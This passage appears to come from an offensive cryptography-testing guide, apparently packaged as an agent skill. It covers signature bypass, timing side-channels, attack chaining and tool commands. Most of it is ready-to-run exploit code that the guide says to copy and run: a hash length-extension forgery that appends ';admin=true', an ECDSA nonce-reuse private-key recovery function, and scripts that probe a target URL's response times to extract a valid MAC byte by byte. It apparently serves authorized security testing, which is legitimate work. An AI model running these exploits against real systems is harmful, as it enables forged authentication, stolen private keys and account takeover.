    If the target exposes any endpoint where:
    1. You send data + a MAC/signature
    2. The MAC appears to be MD5, SHA1, or SHA256
    3. You can observe valid MAC values for known messages

    Then length extension may apply.
    """
    # Indicators:
    # - MAC is exactly 32 hex chars (MD5) or 40 (SHA1) or 64 (SHA256)
    # - MAC changes when message changes (not a static token)
    # - No HMAC library in source code, just hashlib.sha256(secret + data)
    print("[*] Check these conditions:")
    print("    1. MAC length matches raw hash output (32/40/64 hex chars)")
    print("    2. Source uses hash(secret + msg) not hmac.new(secret, msg)")
    print("    3. You have at least one valid (message, MAC) pair")
    print("[*] If all true, use hashpumpy or hlextend to forge MACs")

# Length extension PoC using hlextend (pip install hlextend)
# import hlextend
# sha = hlextend.new('sha256')
# new_data = sha.extend(b';admin=true', b'original_data', 32, known_mac_hex)
# new_mac = sha.hexdigest()
# Now (new_data, new_mac) is a valid pair without knowing the secret
```

**ECDSA nonce reuse detection:**

```python
def detect_ecdsa_nonce_reuse(sig1_r: int, sig1_s: int, msg1_hash: int,
                              sig2_r: int, sig2_s: int, msg2_hash: int,
                              curve_order: int) -> bool:
    """If two ECDSA signatures share the same r value, the nonce k was reused.
    This allows recovery of the private key."""
    if sig1_r == sig2_r:
        print("[!] ECDSA NONCE REUSE: r values match!")
        print("[*] Recovering private key...")

        # k = (msg1_hash - msg2_hash) * inverse(sig1_s - sig2_s) mod n
        s_diff = (sig1_s - sig2_s) % curve_order
        s_diff_inv = pow(s_diff, curve_order - 2, curve_order)
        k = ((msg1_hash - msg2_hash) * s_diff_inv) % curve_order

        # private_key = (sig1_s * k - msg1_hash) * inverse(sig1_r) mod n
        r_inv = pow(sig1_r, curve_order - 2, curve_order)
        private_key = ((sig1_s * k - msg1_hash) * r_inv) % curve_order

        print(f"[!] Recovered private key: {hex(private_key)}")
        return True
    return False
```

### Exploitation Steps

1. Identify the signature scheme (HMAC, RSA, ECDSA, custom hash)
2. Test if signature is actually verified (strip it, send garbage)
3. For hash(secret||message): use length extension to append data
4. For ECDSA: collect multiple signatures, check for `r` value reuse
5. For RSA e=3: if PKCS#1 v1.5 signature parsing is lenient, craft a fake signature that passes validation despite not knowing the private key (Bleichenbacher's low-exponent attack)

### Proof Pattern

Forge a token or signature that the server accepts as valid. For missing verification: strip the signature and access admin resources. For ECDSA nonce reuse: recover the private key and sign arbitrary messages. For length extension: append `;admin=true` to a signed request.

---

## Attack Class 7: Timing Side-Channels in Crypto Code

### Context Signals

- Target performs HMAC/MAC verification on client-supplied values (webhook signatures, API authentication, token validation)
- Source code uses `==` or `equals()` for comparing MAC values instead of constant-time comparison
- Custom signature verification (not using a library's built-in verify function)
- Authentication token validation that can be probed remotely

### Detection Method

Non-constant-time comparison leaks information because it returns `false` as soon as the first byte mismatch is found. Correct first byte = comparison checks second byte = slightly longer response. Correct first two bytes = even longer. This lets you extract the MAC byte-by-byte.

**Statistical timing measurement:**

```python
import requests
import time
import statistics
from typing import Optional

def timing_probe(url: str, mac_param: str, mac_value: str,
                 data: Optional[dict] = None, n: int = 50) -> float:
    """Measure median response time for a given MAC value.
    Uses time.perf_counter_ns for maximum precision."""
    times = []
    headers = {"Content-Type": "application/json"}

    for _ in range(n):
        payload = data or {}
        payload[mac_param] = mac_value

        t_start = time.perf_counter_ns()
        requests.post(url, json=payload, headers=headers, timeout=10)
        t_end = time.perf_counter_ns()
        times.append(t_end - t_start)

    # Use median to reduce noise from network jitter
    return statistics.median(times)

def detect_timing_oracle(url: str, mac_param: str, mac_length: int = 64,
                         data: Optional[dict] = None) -> None:
    """Test if MAC verification is vulnerable to timing attack.

    Send a MAC with all zeros vs a MAC with a correct first byte
    (from a known-valid MAC). If there is a statistically significant
    timing difference, the comparison is not constant-time.
    """
    # Baseline: completely wrong MAC
    wrong_mac = "0" * mac_length
    t_wrong = timing_probe(url, mac_param, wrong_mac, data, n=100)

    # Partially correct: if you have a known-valid MAC, use its first byte
    # Otherwise, brute force the first byte and look for outliers
    print(f"[*] Baseline (all wrong): {t_wrong/1e6:.2f}ms")

    results = {}
    for first_byte in range(256):
        test_mac = f"{first_byte:02x}" + "0" * (mac_length - 2)
        t = timing_probe(url, mac_param, test_mac, data, n=30)
        results[first_byte] = t
        if first_byte % 16 == 15:
            print(f"  Tested {first_byte+1}/256 first-byte values...")

    # Find the outlier (correct first byte takes longer)
    sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
    fastest = sorted_results[-1][1]
    slowest = sorted_results[0][1]
    diff_ns = slowest - fastest

    print(f"\n[*] Fastest: 0x{sorted_results[-1][0]:02x} at {fastest/1e6:.2f}ms")
    print(f"[*] Slowest: 0x{sorted_results[0][0]:02x} at {slowest/1e6:.2f}ms")
    print(f"[*] Difference: {diff_ns/1e6:.3f}ms ({diff_ns/1e3:.1f}us)")

    # Statistical significance test
    all_times = list(results.values())
    mean_t = statistics.mean(all_times)
    stdev_t = statistics.stdev(all_times) if len(all_times) > 1 else 0
    if stdev_t > 0:
        z_score = (slowest - mean_t) / stdev_t
        print(f"[*] Z-score of slowest: {z_score:.2f}")
        if z_score > 2.576:  # p < 0.01
            print(f"[!] TIMING ORACLE DETECTED (p < 0.01)")
            print(f"[!] Likely correct first byte: 0x{sorted_results[0][0]:02x}")
        elif z_score > 1.96:  # p < 0.05
            print(f"[!] POSSIBLE TIMING ORACLE (p < 0.05) - increase sample size")
        else:
            print(f"[+] No statistically significant timing difference")

# Usage:
# detect_timing_oracle(
#     "https://target.com/api/webhook",
#     "signature",
#     mac_length=64,  # SHA-256 hex = 64 chars
#     data={"event": "test", "payload": "data"}
# )
```

### Byte-by-Byte MAC Extraction

```python
def extract_mac_via_timing(url: str, mac_param: str, mac_length: int = 64,
                           data: Optional[dict] = None,
                           samples_per_byte: int = 50) -> str:
    """Extract a MAC value byte-by-byte using timing side-channel."""
    known = ""

    for position in range(0, mac_length, 2):  # 2 hex chars per byte
        best_byte = 0
        best_time = 0

        for byte_val in range(256):
            test_mac = known + f"{byte_val:02x}" + "0" * (mac_length - len(known) - 2)
            t = timing_probe(url, mac_param, test_mac, data, n=samples_per_byte)

            if t > best_time:
                best_time = t
                best_byte = byte_val

        known += f"{best_byte:02x}"
        print(f"[*] Position {position//2}: 0x{best_byte:02x} (MAC so far: {known})")

    print(f"\n[!] Extracted MAC: {known}")
    return known
```

### Source Code Indicators

```bash
# VULNERABLE: byte-by-byte comparison
grep -rn '==.*hmac\|hmac.*==\|digest.*==\|==.*digest\|mac.*==\|==.*mac' \
  --include="*.py" --include="*.js" --include="*.java" --include="*.go" --include="*.rb" .

# VULNERABLE: JavaScript string comparison
grep -rn 'signature\s*===\?\s*\|===\?\s*signature' --include="*.js" --include="*.ts" .

# SAFE: constant-time comparison
grep -rn 'hmac.compare_digest\|crypto.timingSafeEqual\|MessageDigest.isEqual\|subtle.ConstantTimeCompare\|secure_compare\|constant_time_compare' \
  --include="*.py" --include="*.js" --include="*.java" --include="*.go" --include="*.rb" .
```

### Proof Pattern

Demonstrate statistically significant timing differences (p < 0.01) between correct and incorrect MAC prefix bytes. Ideally, extract enough bytes of a valid MAC to forge authenticated requests. At minimum, show the z-score analysis proving the oracle exists with high confidence.

---

## Cross-Class Escalation

Single crypto weaknesses are findings on their own, but chains multiply impact and severity.

| Chain | Impact | Severity |
|-------|--------|----------|
| Weak RNG (Class 1) + JWT token generation | Predict session tokens for any user, mass account takeover | Critical |
| Padding oracle (Class 3) + encrypted session cookie | Decrypt any user's session, forge admin sessions | Critical |
| Algorithm downgrade (Class 5) + MITM position | Decrypt all traffic using broken cipher suite | Critical |
| Nonce reuse (Class 2) + message interception | Recover plaintext from encrypted messages + forge authenticated ciphertexts | Critical |
| Timing oracle (Class 7) + HMAC webhook verification | Forge webhook signatures, inject arbitrary events | High |
| Weak KDF (Class 4) + leaked hash (via IDOR or error) | Crack password offline in seconds, account takeover | High-Critical |
| Signature bypass (Class 6) + API authentication | Forge API requests as any user or service | Critical |
| Nonce reuse (Class 2) + signature bypass (Class 6) | Recover AEAD auth key + forge authenticated ciphertexts at will | Critical |
| Weak RNG (Class 1) + CSRF token generation | Predict CSRF tokens, bypass CSRF protection on state-changing actions | High |
| Padding oracle (Class 3) + algorithm downgrade (Class 5) | Force CBC mode, then exploit padding oracle on the downgraded connection | Critical |

**Chain discovery workflow:**

1. After confirming any single crypto finding, check if it feeds into another class
2. Weak RNG findings: check if the same RNG seeds JWT tokens, CSRF tokens, and password reset tokens
3. Nonce/IV reuse: if you recover keystream, check if the same key encrypts session data, API tokens, and stored secrets
4. Timing oracle: if you extract a MAC key, check if the same key authenticates multiple endpoints
5. Document chains in `chain-canvas.md` with the full attack path

---

## Tool Integration Reference

| Tool | Use Case | Command |
|------|----------|---------|
| testssl.sh | Full TLS configuration audit (ciphers, protocols, vulnerabilities) | `testssl.sh --quiet https://target.com` |
| jwt_tool | JWT-specific testing (alg confusion, claim tampering, brute force) | `python3 jwt_tool.py -t TOKEN -M at` |
| hashcat | Offline hash cracking to prove KDF weakness | `hashcat -m MODE hash.txt wordlist.txt` |
| john | Alternative hash cracker, auto-detects hash format | `john --wordlist=rockyou.txt hashes.txt` |
| nmap | SSL/TLS and SSH cipher enumeration | `nmap --script ssl-enum-ciphers,ssh2-enum-algos -p 443,22 target.com` |
| openssl | Manual TLS testing and certificate inspection | `openssl s_client -connect target.com:443` |
| Python cryptography | Programmatic crypto testing (encrypt, decrypt, sign, verify) | See code blocks throughout this skill |
| hlextend | Hash length extension attacks | `pip install hlextend` (see Class 6 code) |

**Embedded scripts in this skill (copy and run directly):**

- Phase 0: `analyze_token()` - quick token structure identification
- Class 1: `analyze_tokens()` - Shannon entropy and pattern analysis for token collections
- Class 1: Time-based seed brute force PoC
- Class 2: `check_nonce_reuse()` - nonce prefix comparison across ciphertexts
- Class 3: Full padding oracle decryption template
- Class 4: `measure_login_time()` - timing-based KDF detection
- Class 6: `detect_ecdsa_nonce_reuse()` - ECDSA private key recovery
- Class 7: `detect_timing_oracle()` - statistical timing analysis with z-score
- Class 7: `extract_mac_via_timing()` - byte-by-byte MAC extraction
